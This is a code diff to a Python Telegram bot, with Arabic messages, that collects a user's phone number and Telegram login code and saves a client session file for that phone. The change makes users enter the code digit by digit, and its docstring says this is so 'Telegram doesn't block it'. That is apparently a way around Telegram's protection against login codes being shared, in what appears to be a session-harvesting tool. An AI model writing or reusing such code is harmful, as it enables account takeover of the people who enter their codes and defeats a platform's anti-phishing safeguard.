@@ -783,7 +783,8 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = await context.bot.send_message(
             chat_id=user_id,
             text=f"{DECOR_CODE} تم إرسال كود التحقق!\n\n"
-                 f"📲 أدخل الكود كامل مرة واحدة (مثال: 12345)\n\n"
+                 f"📲 أدخل أرقام الكود **واحد واحد**\n"
+                 f"○○○○○ (5 أرقام)\n\n"
                  f"⚠️ لا تشاركه مع أي أحد!"
         )
         context.user_data["last_message_id"] = msg.message_id
@@ -798,30 +799,51 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
 async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """✅ الإصلاح: بيطلب الكود مرة واحدة كامل مش رقم رقم"""
+    """رقم رقم عشان تيليجرام مش بيحجبه"""
     user_id = update.effective_user.id
 
     if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
         return ConversationHandler.END
 
-    code = update.message.text.strip().replace(" ", "")
+    digit = update.message.text.strip()
 
-    # ✅ حذف رسالة الكود فوراً (خصوصية مهمة!)
+    # ✅ حذف رسالة الرقم فوراً
     try:
         await update.message.delete()
     except Exception:
         pass
 
-    if not code.isdigit() or len(code) < 4:
+    if not digit.isdigit() or len(digit) != 1:
         await delete_previous_message(context, user_id)
         msg = await context.bot.send_message(
             chat_id=user_id,
-            text=f"{DECOR_ERROR} الكود غير صحيح!\n\nأدخل الكود كامل (أرقام فقط، مثال: 12345)"
+            text=f"{DECOR_ERROR} أدخل رقم واحد بس!"
         )
         context.user_data["last_message_id"] = msg.message_id
         return CODE_STATE
 
     store = get_user_store(user_id)
+    if 'code_digits' not in store:
+        store['code_digits'] = []
+    store['code_digits'].append(digit)
+
+    # لو لسه ما اكتملناش
+    if len(store['code_digits']) < 5:
+        current = len(store['code_digits'])
+        filled = "●" * current
+        empty = "○" * (5 - current)
+        await delete_previous_message(context, user_id)
+        msg = await context.bot.send_message(
+            chat_id=user_id,
+            text=f"{DECOR_CODE} {filled}{empty} ({current}/5)
+
+أدخل الرقم التالي:"
+        )
+        context.user_data["last_message_id"] = msg.message_id
+        return CODE_STATE
+
+    code = "".join(store['code_digits'])
+    store['code_digits'] = []  # مسح بعد الاستخدام
     client = store['client']
     phone = store['phone']
     session_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.session")
